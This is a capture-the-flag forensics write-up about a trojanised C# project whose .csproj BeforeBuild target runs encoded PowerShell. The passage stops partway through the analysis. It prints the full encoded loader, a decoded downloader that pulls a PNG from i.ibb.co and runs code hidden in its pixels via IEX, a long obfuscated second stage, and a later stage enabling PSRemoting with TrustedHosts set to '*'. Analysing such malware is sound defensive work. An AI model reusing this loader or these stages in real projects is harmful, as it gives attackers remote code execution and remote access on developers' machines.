# Description
It was a cloudy Sunday morning, and I was enjoying the soothing sounds of nature with a cold breeze hitting my window. After making some coffee, I sat at my PC and opened Stack Overflow, as I usually do. The first post I saw was about a code issue related to Bubble Sort. The code appeared flawless, but the user insisted that the problem was with VSCode, claiming the error was due to an unsupported version.

The user seemed frustrated and offered a large bounty, so I decided to help. We continued the conversation in private messages. He mentioned a school project deadline for the next day and needed an urgent solution. He sent me the entire VSCode project, and I opened the .sln file to see if I could replicate the error. However, everything worked fine on my end, and I told him so.

He didn't respond, and shortly after, the post was deleted. I felt scammed but moved on with my day. A week later, I noticed unusual activity on my machine. I have a suspicion it’s connected to that Bubble Sort project. Can you help?

# Solution
We are given a zip file. Upon extracting its contents, we are met with a VSCode project as described by the challenge description:  

![](Images/image1.png)  

The description states that clearly something weird is going on with this project. We can investigate ourselves each file, since they are not that many. When we land our attention on the `.csproj` file - a file containing necessary info for the VSCode to run a project - we spot a very suspicious part in the file:  

```csharp
  <Target Name="BeforeBuild">
  <Exec Command="powershell.exe -ExecutionPolicy Bypass -EncodedCommand cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AEEAZABkAC0AVAB5AHAAZQAgAC0AQQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AGEAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBCAGkAdABtAGEAcAAoACgAYQAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAE8AcABlAG4AUgBlAGEAZAAoACIAaAB0AHQAcABzADoALwAvAGkALgBpAGIAYgAuAGMAbwAvADEAWQBNAE4ANwBoAFAASAAvAG4AbQBvAGUAcgBtAGYAbwBlAGkAZwBuAGUAcgAuAHAAbgBnACIAKQApADsAJABvAD0AYQAgAEIAeQB0AGUAWwBdACAANgA4ADAAMAA7ACgAMAAuAC4AMwAzACkAfAAlAHsAZgBvAHIAZQBhAGMAaAAoACQAeAAgAGkAbgAoADAALgAuADEAOQA5ACkAKQB7ACQAcAA9ACQAZwAuAEcAZQB0AFAAaQB4AGUAbAAoACQAeAAsACQAXwApADsAJABvAFsAJABfACoAMgAwADAAKwAkAHgAXQA9ACgAWwBtAGEAdABoAF0AOgA6AEYAbABvAG8AcgAoACgAJABwAC4AQgAtAGIAYQBuAGQAMQA1ACkAKgAxADYAKQAtAGIAbwByACgAJABwAC4ARwAgAC0AYgBhAG4AZAAgADEANQApACkAfQB9ADsASQBFAFgAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwBbADAALgAuADYANgAyADgAXQApACkA" />
</Target>

</Project> 
```

Turns out that besides information regarding the project, this file can also run commands when building/opening the project.  
> *For further reading you can give a read to [this article](https://www.outflank.nl/blog/2023/03/28/attacking-visual-studio-for-initial-access/) from a real life event*  

We copy the encoded command and navigate to CyberChef, an online tool with builtin tools that will help us get back the [decoded command](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Remove_null_bytes()&input=Y3dCaEFHd0FJQUJoQUNBQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQTdBRUVBWkFCa0FDMEFWQUI1QUhBQVpRQWdBQzBBUVFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBUkFCeUFHRUFkd0JwQUc0QVp3QTdBQ1FBWndBOUFHRUFJQUJUQUhrQWN3QjBBR1VBYlFBdUFFUUFjZ0JoQUhjQWFRQnVBR2NBTGdCQ0FHa0FkQUJ0QUdFQWNBQW9BQ2dBWVFBZ0FFNEFaUUIwQUM0QVZ3QmxBR0lBUXdCc0FHa0FaUUJ1QUhRQUtRQXVBRThBY0FCbEFHNEFVZ0JsQUdFQVpBQW9BQ0lBYUFCMEFIUUFjQUJ6QURvQUx3QXZBR2tBTGdCcEFHSUFZZ0F1QUdNQWJ3QXZBREVBV1FCTkFFNEFOd0JvQUZBQVNBQXZBRzRBYlFCdkFHVUFjZ0J0QUdZQWJ3QmxBR2tBWndCdUFHVUFjZ0F1QUhBQWJnQm5BQ0lBS1FBcEFEc0FKQUJ2QUQwQVlRQWdBRUlBZVFCMEFHVUFXd0JkQUNBQU5nQTRBREFBTUFBN0FDZ0FNQUF1QUM0QU13QXpBQ2tBZkFBbEFIc0FaZ0J2QUhJQVpRQmhBR01BYUFBb0FDUUFlQUFnQUdrQWJnQW9BREFBTGdBdUFERUFPUUE1QUNrQUtRQjdBQ1FBY0FBOUFDUUFad0F1QUVjQVpRQjBBRkFBYVFCNEFHVUFiQUFvQUNRQWVBQXNBQ1FBWHdBcEFEc0FKQUJ2QUZzQUpBQmZBQ29BTWdBd0FEQUFLd0FrQUhnQVhRQTlBQ2dBV3dCdEFHRUFkQUJvQUYwQU9nQTZBRVlBYkFCdkFHOEFjZ0FvQUNnQUpBQndBQzRBUWdBdEFHSUFZUUJ1QUdRQU1RQTFBQ2tBS2dBeEFEWUFLUUF0QUdJQWJ3QnlBQ2dBSkFCd0FDNEFSd0FnQUMwQVlnQmhBRzRBWkFBZ0FERUFOUUFwQUNrQWZRQjlBRHNBU1FCRkFGZ0FLQUJiQUZNQWVRQnpBSFFBWlFCdEFDNEFWQUJsQUhnQWRBQXVBRVVBYmdCakFHOEFaQUJwQUc0QVp3QmRBRG9BT2dCQkFGTUFRd0JKQUVrQUxnQkhBR1VBZEFCVEFIUUFjZ0JwQUc0QVp3QW9BQ1FBYndCYkFEQUFMZ0F1QURZQU5nQXlBRGdBWFFBcEFDa0E&oeol=CRLF):  

![](Images/image2.png)  

So the command that will be run from this suspicious VSCode project is:  
```powershell
sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://i.ibb.co/1YMN7hPH/nmoermfoeigner.png"));$o=a Byte[] 6800;(0..33)|%{foreach($x in(0..199)){$p=$g.GetPixel($x,$_);$o[$_*200+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..6628]))
```

Very interesting...  
This command opens a `.png` image from the `https://i.ibb.co` website, reads its pixels, for each pixel it gets its RGB values and performs bitwise OR operations.  
The `png` it tries to load is the following:  

![](Images/image3.png)

After it has completed its parsing of the pixels RGB values, it executes the result via `IEX`. This immediately raises red flags as we have execution of whatever is inside these pixels.  

To get the command that will be executed back, we simply have to replace `IEX` with `Write-Output` and we will get the following obfuscated script back:  

```powershell
FLARE-VM 03/01/2025 07:05:31
PS C:\Users\[user] > sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://i.ibb.co/1YMN7hPH/nmoermfoeigner.png"));$o=a Byte[] 6800;(0..33)|%{foreach($x in(0..199)){$p=$g.GetPixel($x,$_);$o[$_*200+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};Write-Output([System.Text.Encoding]::ASCII.GetString($o[0..6628]))

sEt O864Ew ([TYpE](  ('syS'+'t'  )  +( 'e'  +  'm.c')  +  (  (  "{0}{1}"-f'oNV','E')+  'Rt'  )  )    ); ${67`LhO}   = [TYpE]( ( 'SY'  + 'sT' )+  ( 'Em'+ '.i')+ (  (  "{0}{1}"-f 'O','.cOMp' )  + 're'+  'ss' )  + (  (  "{0}{1}"-f 'iOn','.C')+  'OmP')  + 'r'  +  ( 'e' +  'SSi'  )+( ( "{0}{1}"-f 'Onm','O'  ) +'d'  )  +'e'  );   SeT-itEm vArIaBle:6qsM  ( [tYpE]((  'te' + 'X' )  +( ( "{1}{0}"-f'.en','t' )+'c'+'OdI'  ) + 'NG'  ) )  ;    (.(  'NE'+ ( 'W-O'+'BJ')+ ('EC' +'t'))  (  'i'+(  'O'+ ("{0}{1}" -f '.C','OMP') )  +(  'r'  +  'eS') +  ('S'+ ("{0}{1}" -f 'IO','n.'  ))+ ((  "{1}{0}"-f 'eFl','d')  +  'ATe'  +'sTR'  )+'E'  +'AM'  )(  [io.meMORYsTrEaM]  ${O`864eW}::FRoMbaSe64string(   ( ( "{1}{0}"-f 'L','bVd'  ) + ("{0}{4}{1}{2}{3}" -f'c9pIEL6nKv9','0gFuMS','4M1aqcoBG','x','Bh6') + ( "{10}{1}{9}{4}{6}{2}{7}{11}{13}{8}{0}{3}{5}{12}{14}"-f'DeJvOMgL','EWE6JED3Yk/','LB','0','r','od','J','zQ','88/VjmmPLtv649vyzfK5mvrrwt','Cz++/Z','mzhYESwibr8k','B','T','rNdPd','9Z' ) +  ("{1}{0}" -f'Zz','287' )+( "{1}{3}{0}{2}" -f '9s/p','1Ltr','KGs0mqB','NZaN' )  +  ("{5}{23}{34}{29}{10}{8}{32}{19}{28}{4}{35}{27}{22}{11}{25}{0}{36}{14}{33}{9}{7}{21}{26}{20}{24}{31}{13}{15}{6}{3}{16}{30}{12}{2}{17}{1}{18}"-f'xIEN','f5','wr','EVdmO','xeOz','g2','bA','q9','a','t+CXw','sXp3d','33E','4I2','C4ivYHtAwAhvmVjCJ8AiV','roT','J','S7QFRkEqPY','0','6ks','32t','2C','Js+FZInNm','+','w3L','M/jNK5lpIEsxTllW02pf5D','2qMngcwW8y','rQ','X','29nu','KJu','QFj','pSHz8wkGw','2/','14','+mTB','uYa','j0a' )  +( "{4}{6}{0}{2}{5}{7}{3}{1}"-f'X5','Sz','dTGRT','cTSOFWK','hvLOvoynUX','lcrO','8s','W')  +( "{5}{2}{0}{1}{6}{4}{3}"-f'k','dE6','5','LQjzM','3k84c','2C','8BfzQK' )+( "{6}{2}{1}{8}{3}{5}{4}{0}{7}" -f '7d','2kN','N7H','1','MPH/','7/q','ZWoe0','6','kST9Stn')+ ("{5}{6}{4}{3}{0}{8}{2}{7}{1}"-f '3dYtvPj','zidoGm6zABk','PbuelP8','5dBz47','/','WkL','x','rWdy','b6TW' )+ (  "{2}{3}{1}{0}" -f 'fnf','++P','a2i','o/yJhj9' )+("{4}{8}{3}{2}{7}{5}{9}{6}{10}{0}{1}" -f'hjx','NgEoSMb','5ZX/d','Qhf3nt','6','8','Yea','c2QVR','/b','u','ajXFm'  ) +(  "{7}{10}{20}{14}{0}{13}{11}{18}{1}{4}{16}{12}{5}{19}{9}{15}{8}{17}{6}{2}{3}" -f 'Oxd6z','Ru4MUu3SbJJEwB','nV','V','K5','blH','nqkKdA','H','M5x','P','sh','lFhol1fGt','a','/vJgp','Q','s','o','yHJ','D78T4AU','JIuCqEA','wRbn' )+  'x' +  ( "{4}{7}{3}{5}{1}{8}{6}{0}{2}"-f 'V','+K','Dae9rE','+i','bShLW0XibKMyQZp','iaj','ThTAe','Ny','8m1W' ) +("{9}{13}{15}{6}{12}{2}{4}{7}{17}{14}{18}{1}{8}{0}{16}{10}{11}{5}{3}" -f'icPU','3T0RBq4','wI','nDnxA','zLIrHXK8sG','u','M','2hDFvAhe','9','WhV','N','l3KIaZ','Vi','fkKh','p','AA1ELtY','D6qAn6uI4SKFC13','dC','U4EpQSYo+u1KgsIT'  )  +  ("{2}{4}{0}{3}{1}" -f'SUaRachlQ1O/m','Xq','dueBz7Q','CVhnA','e'  ) + (  "{6}{8}{3}{2}{0}{1}{7}{4}{5}" -f 'OXJ+j','X','A','h','K7Lf','x5wLzsD','qUTo','y0i','nE' )  +(  "{0}{4}{2}{1}{3}" -f 'm','t','d+7jF6C','4wvRCikeX','f'  )  + ( "{0}{2}{1}"-f'7O','n','uoT5pnM')  + (  "{19}{3}{5}{26}{6}{22}{17}{31}{16}{23}{2}{21}{18}{14}{24}{12}{0}{4}{25}{1}{27}{9}{28}{7}{15}{11}{20}{10}{13}{29}{8}{30}" -f 'Q0pA66','v','4','Mos','oQDhoQ','n2','5','OXu','mgAkqrt2J','fsDn','l','o','UF','JAa','R','VTLHpX','vuRoIVWe9q','UMZ','pV','Tr3','ts','HAB2bo','u','x','4','Qcc','lvwv','i','OTC','KKSzd','p1T0XgcyyA','P' ) +  ("{6}{8}{3}{5}{1}{2}{9}{0}{10}{7}{4}" -f 'L74Ne1','N','vLxM5I7y','b','E5jI5','yJI','+2','1c','RoinGVXDn','+r5hre','/IX') +(  "{0}{2}{17}{3}{19}{1}{7}{6}{14}{4}{8}{12}{9}{15}{16}{13}{5}{10}{18}{20}{11}"-f'T','+NS','7','CW','9Xg7Nn','db8o4','P','A','MdUfOt64','dmnvl6B5rB21qmEtnQrWV8lL','zzBSEK','kUkj','p','iI','yS9','iJm','BK','q3o6hGGJA5','gpf','Cx','3') + (  "{26}{11}{2}{7}{13}{9}{6}{10}{4}{22}{24}{3}{5}{16}{0}{12}{19}{14}{20}{15}{17}{21}{23}{27}{25}{8}{1}{18}"-f'fQw','3P','a','j','E','KDU','bv6sY','laN','LN8k','YF3/','cV','kR','rLGlm','+','G','RN','d','CA','tSiC','t','9PHDM','fAu6VC0v3Lr','a','S2dVUSh74xw','8','a','booFJi','LYmQk+bkg')+ (  "{18}{7}{15}{9}{2}{17}{0}{14}{16}{4}{11}{12}{5}{19}{13}{3}{8}{6}{10}{1}" -f 'b','SbBk','BlX4','UU0V','yQ','gC','B','9','pC6vMwpTj9h','vFhD','v','ZW','Pz','Xqk','Aitpnw','w','GSUQ','JZrnW83','cqSr','U' ) +(  "{2}{0}{1}" -f'Z','7F','eO6vzPUT') + (  "{1}{0}{2}{3}{9}{6}{12}{4}{7}{13}{10}{8}{11}{5}" -f'q','h+','Ce6VAoQhR','l','47C','Xpk','tsTYbrYI4zz2OF72hR6','D','f','z','DNr8zeUez+','X','wU9n','B1od' )+ ( "{0}{1}"-f 'uz','H12')+  ( "{0}{3}{7}{1}{6}{10}{4}{9}{5}{2}{8}"-f'RdywqDac','vqaOWSa','QZqbSq','K','Z8UCoD','W9','X','wP5','c','yE','cl0ADo') + 's' +("{14}{9}{8}{32}{34}{2}{17}{25}{20}{5}{15}{10}{26}{22}{4}{27}{0}{35}{19}{16}{3}{29}{11}{21}{7}{28}{12}{33}{31}{18}{6}{23}{13}{30}{1}{24}" -f 'n','nGDYV','R','bsgq8f','Zx','l','MG','O','IIJlgJvArv','mOty2','IwwVc','0jI','OtPX','dR8vCfX99gD','l2s4gkJz','x/a','yfOL','KF','J+gxcy','9B','2','3M','iq','FyN','lU','5O+jT','w','k','uBv','YOJZ','Tt5Y','1iCq','MN6RS','Hf','Z','iILkyld' ) + (  "{0}{2}{3}{1}"-f'4','zmeW','or','jQH7GDI')+("{20}{37}{35}{10}{11}{38}{28}{7}{39}{26}{3}{40}{12}{13}{22}{4}{5}{18}{2}{30}{6}{0}{33}{32}{9}{17}{23}{8}{41}{14}{15}{21}{16}{34}{27}{19}{24}{29}{36}{31}{25}{1}"-f'dSoak','Tfmo','t','u','hqeB8','TwqrBlyiEdcMl1s36p7','7N','RoHq','e','AhA','Y6l6E','pM','zz','Ks','29','3r','kio','Zpx6P','OTBB','X','a','TrxQiw5fivCI','Us','vU','h','e8','sSpEeiNRMMoT','lB1dQbK7X','XQY','sJ','JwMW','Z4y','yfRG','r','UZe','f5','kO','qnyvd+pCGsfFJgm','85X','U','65nOy','h') +  ( "{4}{21}{3}{16}{13}{25}{5}{11}{22}{26}{19}{7}{29}{17}{23}{18}{12}{27}{15}{8}{9}{1}{10}{6}{24}{0}{28}{20}{14}{2}" -f'VSBD','VYal','swhZ','8To+3+q','l','C','T','5mKmHlzmGVPp5pPrE','iN1a8G4is','i1Y','H','eA','x','aet','E7','7JHR7oPnvqmOUs9yP','RZB','zLdR','rukjvZS','creD1','98Rb0h','y','zpSi3Ubj/EqHlS+xuD','v','s','G7bnl2','3puIm','Sbx2D1o7','f','8HBz'  ) +(  "{3}{0}{1}{2}{4}"-f 'JM','OoH','8Sm','rNk','g84Ml4KmZopC'  )+ ( "{11}{8}{7}{13}{10}{3}{0}{9}{4}{5}{1}{16}{14}{6}{15}{2}{12}"-f 'y','Vz','1t','3Dcs1iQZ','X3','3tUYZ6Z','KY','p6','zRYMbS','ovqGQh+hvn','NSUw','/l0GI','vNL','6o','wgJb','3Mlt','2/o/')  +  (  "{1}{2}{0}{3}" -f'n','NSZ3','YHK0tTcbh5F','Na')+ ("{1}{2}{3}{4}{0}"-f '/7','B','oNI5','uzy9','D6Mc')  +(  "{0}{1}"-f 'y1Y','N' ) +( "{7}{1}{4}{9}{10}{2}{8}{5}{0}{11}{12}{13}{3}{6}" -f 'vOpXUZ','R3+f','C','D','yqDj','L','1YxZcdMf/','k92Ok6L','i','OE1R6Z1','U','zPq9Cp53','C','Ly1Qz/Nt'  )  )  ) , (  dIr  (  'VA' + 'RI'+ ( 'aBL'  + ( "{1}{0}"-f '7l','e:6' ) +  'hO'  )  ) ).vaLue::DecomPRess )  | &(  (  'F' + ("{0}{1}"-f'ORe','Ac'))  +  ('H-' + 'OB'  )+ 'jE'  + 'cT' ) {   .(  'ne' +  (  ("{1}{0}"-f 'B','w-o'  ) +'j'  + 'eC')+  't')  ('s'  +  ('Y'+ 'sT')  +('e' +  'M.' )  +('Io'  +'.')+  'st'  + 'R' +( ( "{1}{0}" -f'MRE','Ea' )  + 'A' + 'der'  )  )(  ${_} ,  ${6q`sM}::aSCII) } ).ReaDTOeNd(    )  | &  (   ${psH`OMe}[21] +  ${psh`OME}[30] + 'X')
```

Well, definitely there is something malicious going on here.  We notice that it tries to decompress the base64 blob that is being reconstructed with format string methods, and then execute it via `IEX` which has been written in an obfuscated format:
```ps1
> Write-Output (   ${psH`OMe}[21] +  ${psh`OME}[30] + 'X')
iex
```
To see what will be executed, we need to mimic what the script does and:
- Decode from base64
- Decompress the result

OR we can cheat and change once again the IEX string to Write-Output because we are lazy. This will return back:
```ps1
FLARE-VM 03/01/2025 07:06:21
PS C:\Users\mons_unit45 > sEt O864Ew ([TYpE](  ('syS'+'t'  )  +( 'e'  +  'm.c')  +  (  (  "{0}{1}"-f'oNV','E')+  'Rt'  )  )    ); ${67`LhO}   = [TYpE]( ( 'SY'  + 'sT' )+  ( 'Em'+ '.i')+ (  (  "{0}{1}"-f 'O','.cOMp' )  + 're'+  'ss' )  + (  (  "{0}{1}"-f 'iOn','.C')+  'OmP')  + 'r'  +  ( 'e' +  'SSi'  )+( ( "{0}{1}"-f 'Onm','O'  ) +'d'  )  +'e'  );   SeT-itEm vArIaBle:6qsM  ( [tYpE]((  'te' + 'X' )  +( ( "{1}{0}"-f'.en','t' )+'c'+'OdI'  ) + 'NG'  ) )  ;    (.(  'NE'+ ( 'W-O'+'BJ')+ ('EC' +'t'))  (  'i'+(  'O'+ ("{0}{1}" -f '.C','OMP') )  +(  'r'  +  'eS') +  ('S'+ ("{0}{1}" -f 'IO','n.'  ))+ ((  "{1}{0}"-f 'eFl','d')  +  'ATe'  +'sTR'  )+'E'  +'AM'  )(  [io.meMORYsTrEaM]  ${O`864eW}::FRoMbaSe64string(   ( ( "{1}{0}"-f 'L','bVd'  ) + ("{0}{4}{1}{2}{3}" -f'c9pIEL6nKv9','0gFuMS','4M1aqcoBG','x','Bh6') + ( "{10}{1}{9}{4}{6}{2}{7}{11}{13}{8}{0}{3}{5}{12}{14}"-f'DeJvOMgL','EWE6JED3Yk/','LB','0','r','od','J','zQ','88/VjmmPLtv649vyzfK5mvrrwt','Cz++/Z','mzhYESwibr8k','B','T','rNdPd','9Z' ) +  ("{1}{0}" -f'Zz','287' )+( "{1}{3}{0}{2}" -f '9s/p','1Ltr','KGs0mqB','NZaN' )  +  ("{5}{23}{34}{29}{10}{8}{32}{19}{28}{4}{35}{27}{22}{11}{25}{0}{36}{14}{33}{9}{7}{21}{26}{20}{24}{31}{13}{15}{6}{3}{16}{30}{12}{2}{17}{1}{18}"-f'xIEN','f5','wr','EVdmO','xeOz','g2','bA','q9','a','t+CXw','sXp3d','33E','4I2','C4ivYHtAwAhvmVjCJ8AiV','roT','J','S7QFRkEqPY','0','6ks','32t','2C','Js+FZInNm','+','w3L','M/jNK5lpIEsxTllW02pf5D','2qMngcwW8y','rQ','X','29nu','KJu','QFj','pSHz8wkGw','2/','14','+mTB','uYa','j0a' )  +( "{4}{6}{0}{2}{5}{7}{3}{1}"-f'X5','Sz','dTGRT','cTSOFWK','hvLOvoynUX','lcrO','8s','W')  +( "{5}{2}{0}{1}{6}{4}{3}"-f'k','dE6','5','LQjzM','3k84c','2C','8BfzQK' )+( "{6}{2}{1}{8}{3}{5}{4}{0}{7}" -f '7d','2kN','N7H','1','MPH/','7/q','ZWoe0','6','kST9Stn')+ ("{5}{6}{4}{3}{0}{8}{2}{7}{1}"-f '3dYtvPj','zidoGm6zABk','PbuelP8','5dBz47','/','WkL','x','rWdy','b6TW' )+ (  "{2}{3}{1}{0}" -f 'fnf','++P','a2i','o/yJhj9' )+("{4}{8}{3}{2}{7}{5}{9}{6}{10}{0}{1}" -f'hjx','NgEoSMb','5ZX/d','Qhf3nt','6','8','Yea','c2QVR','/b','u','ajXFm'  ) +(  "{7}{10}{20}{14}{0}{13}{11}{18}{1}{4}{16}{12}{5}{19}{9}{15}{8}{17}{6}{2}{3}" -f 'Oxd6z','Ru4MUu3SbJJEwB','nV','V','K5','blH','nqkKdA','H','M5x','P','sh','lFhol1fGt','a','/vJgp','Q','s','o','yHJ','D78T4AU','JIuCqEA','wRbn' )+  'x' +  ( "{4}{7}{3}{5}{1}{8}{6}{0}{2}"-f 'V','+K','Dae9rE','+i','bShLW0XibKMyQZp','iaj','ThTAe','Ny','8m1W' ) +("{9}{13}{15}{6}{12}{2}{4}{7}{17}{14}{18}{1}{8}{0}{16}{10}{11}{5}{3}" -f'icPU','3T0RBq4','wI','nDnxA','zLIrHXK8sG','u','M','2hDFvAhe','9','WhV','N','l3KIaZ','Vi','fkKh','p','AA1ELtY','D6qAn6uI4SKFC13','dC','U4EpQSYo+u1KgsIT'  )  +  ("{2}{4}{0}{3}{1}" -f'SUaRachlQ1O/m','Xq','dueBz7Q','CVhnA','e'  ) + (  "{6}{8}{3}{2}{0}{1}{7}{4}{5}" -f 'OXJ+j','X','A','h','K7Lf','x5wLzsD','qUTo','y0i','nE' )  +(  "{0}{4}{2}{1}{3}" -f 'm','t','d+7jF6C','4wvRCikeX','f'  )  + ( "{0}{2}{1}"-f'7O','n','uoT5pnM')  + (  "{19}{3}{5}{26}{6}{22}{17}{31}{16}{23}{2}{21}{18}{14}{24}{12}{0}{4}{25}{1}{27}{9}{28}{7}{15}{11}{20}{10}{13}{29}{8}{30}" -f 'Q0pA66','v','4','Mos','oQDhoQ','n2','5','OXu','mgAkqrt2J','fsDn','l','o','UF','JAa','R','VTLHpX','vuRoIVWe9q','UMZ','pV','Tr3','ts','HAB2bo','u','x','4','Qcc','lvwv','i','OTC','KKSzd','p1T0XgcyyA','P' ) +  ("{6}{8}{3}{5}{1}{2}{9}{0}{10}{7}{4}" -f 'L74Ne1','N','vLxM5I7y','b','E5jI5','yJI','+2','1c','RoinGVXDn','+r5hre','/IX') +(  "{0}{2}{17}{3}{19}{1}{7}{6}{14}{4}{8}{12}{9}{15}{16}{13}{5}{10}{18}{20}{11}"-f'T','+NS','7','CW','9Xg7Nn','db8o4','P','A','MdUfOt64','dmnvl6B5rB21qmEtnQrWV8lL','zzBSEK','kUkj','p','iI','yS9','iJm','BK','q3o6hGGJA5','gpf','Cx','3') + (  "{26}{11}{2}{7}{13}{9}{6}{10}{4}{22}{24}{3}{5}{16}{0}{12}{19}{14}{20}{15}{17}{21}{23}{27}{25}{8}{1}{18}"-f'fQw','3P','a','j','E','KDU','bv6sY','laN','LN8k','YF3/','cV','kR','rLGlm','+','G','RN','d','CA','tSiC','t','9PHDM','fAu6VC0v3Lr','a','S2dVUSh74xw','8','a','booFJi','LYmQk+bkg')+ (  "{18}{7}{15}{9}{2}{17}{0}{14}{16}{4}{11}{12}{5}{19}{13}{3}{8}{6}{10}{1}" -f 'b','SbBk','BlX4','UU0V','yQ','gC','B','9','pC6vMwpTj9h','vFhD','v','ZW','Pz','Xqk','Aitpnw','w','GSUQ','JZrnW83','cqSr','U' ) +(  "{2}{0}{1}" -f'Z','7F','eO6vzPUT') + (  "{1}{0}{2}{3}{9}{6}{12}{4}{7}{13}{10}{8}{11}{5}" -f'q','h+','Ce6VAoQhR','l','47C','Xpk','tsTYbrYI4zz2OF72hR6','D','f','z','DNr8zeUez+','X','wU9n','B1od' )+ ( "{0}{1}"-f 'uz','H12')+  ( "{0}{3}{7}{1}{6}{10}{4}{9}{5}{2}{8}"-f'RdywqDac','vqaOWSa','QZqbSq','K','Z8UCoD','W9','X','wP5','c','yE','cl0ADo') + 's' +("{14}{9}{8}{32}{34}{2}{17}{25}{20}{5}{15}{10}{26}{22}{4}{27}{0}{35}{19}{16}{3}{29}{11}{21}{7}{28}{12}{33}{31}{18}{6}{23}{13}{30}{1}{24}" -f 'n','nGDYV','R','bsgq8f','Zx','l','MG','O','IIJlgJvArv','mOty2','IwwVc','0jI','OtPX','dR8vCfX99gD','l2s4gkJz','x/a','yfOL','KF','J+gxcy','9B','2','3M','iq','FyN','lU','5O+jT','w','k','uBv','YOJZ','Tt5Y','1iCq','MN6RS','Hf','Z','iILkyld' ) + (  "{0}{2}{3}{1}"-f'4','zmeW','or','jQH7GDI')+("{20}{37}{35}{10}{11}{38}{28}{7}{39}{26}{3}{40}{12}{13}{22}{4}{5}{18}{2}{30}{6}{0}{33}{32}{9}{17}{23}{8}{41}{14}{15}{21}{16}{34}{27}{19}{24}{29}{36}{31}{25}{1}"-f'dSoak','Tfmo','t','u','hqeB8','TwqrBlyiEdcMl1s36p7','7N','RoHq','e','AhA','Y6l6E','pM','zz','Ks','29','3r','kio','Zpx6P','OTBB','X','a','TrxQiw5fivCI','Us','vU','h','e8','sSpEeiNRMMoT','lB1dQbK7X','XQY','sJ','JwMW','Z4y','yfRG','r','UZe','f5','kO','qnyvd+pCGsfFJgm','85X','U','65nOy','h') +  ( "{4}{21}{3}{16}{13}{25}{5}{11}{22}{26}{19}{7}{29}{17}{23}{18}{12}{27}{15}{8}{9}{1}{10}{6}{24}{0}{28}{20}{14}{2}" -f'VSBD','VYal','swhZ','8To+3+q','l','C','T','5mKmHlzmGVPp5pPrE','iN1a8G4is','i1Y','H','eA','x','aet','E7','7JHR7oPnvqmOUs9yP','RZB','zLdR','rukjvZS','creD1','98Rb0h','y','zpSi3Ubj/EqHlS+xuD','v','s','G7bnl2','3puIm','Sbx2D1o7','f','8HBz'  ) +(  "{3}{0}{1}{2}{4}"-f 'JM','OoH','8Sm','rNk','g84Ml4KmZopC'  )+ ( "{11}{8}{7}{13}{10}{3}{0}{9}{4}{5}{1}{16}{14}{6}{15}{2}{12}"-f 'y','Vz','1t','3Dcs1iQZ','X3','3tUYZ6Z','KY','p6','zRYMbS','ovqGQh+hvn','NSUw','/l0GI','vNL','6o','wgJb','3Mlt','2/o/')  +  (  "{1}{2}{0}{3}" -f'n','NSZ3','YHK0tTcbh5F','Na')+ ("{1}{2}{3}{4}{0}"-f '/7','B','oNI5','uzy9','D6Mc')  +(  "{0}{1}"-f 'y1Y','N' ) +( "{7}{1}{4}{9}{10}{2}{8}{5}{0}{11}{12}{13}{3}{6}" -f 'vOpXUZ','R3+f','C','D','yqDj','L','1YxZcdMf/','k92Ok6L','i','OE1R6Z1','U','zPq9Cp53','C','Ly1Qz/Nt'  )  )  ) , (  dIr  (  'VA' + 'RI'+ ( 'aBL'  + ( "{1}{0}"-f '7l','e:6' ) +  'hO'  )  ) ).vaLue::DecomPRess )  | &(  (  'F' + ("{0}{1}"-f'ORe','Ac'))  +  ('H-' + 'OB'  )+ 'jE'  + 'cT' ) {   .(  'ne' +  (  ("{1}{0}"-f 'B','w-o'  ) +'j'  + 'eC')+  't')  ('s'  +  ('Y'+ 'sT')  +('e' +  'M.' )  +('Io'  +'.')+  'st'  + 'R' +( ( "{1}{0}" -f'MRE','Ea' )  + 'A' + 'der'  )  )(  ${_} ,  ${6q`sM}::aSCII) } ).ReaDTOeNd(    )  | Write-Output

. ( $VERBoSePReFErENcE.TostriNg()[1,3]+'X'-jOIn'') ( (('  &  ( nNd{0}{3}{2}{4}{1}nNd-f 9pmen9pm,9pmNG9pm,(9pm'+'rE9pm+9pmm9pm),(9pmaBl9pm+9pmE9pm+9pm-'+'P'+'S9pm),(9pmOT9pm+9pmi9pm)  ) -Force
  &  (nN'+'d{1}{0}nNd-f ((nNd'+'{0}{1}nNd -f 9pme9pm,9pmt-it9pm)+9p'+'mE9pm+9pmm9pm),9pms9pm) (9pmwSm9pm+9pma9pm+9pmn:LOcAL9pm+9pmHO9pm+9pmstXpg9pm+9pmcLieN'+'9pm+9pmTXp9pm+9pmgTRUSTed9pm+9pmh9'+'pm+9pmo9pm+9pmSTs9pm).rEp'+'lAce(([ChA'+'R]88+[ChAR]1'+'12+['+'ChAR]103),[StRIng][ChAR]92) -Val'+'ue (9pm*9pm)
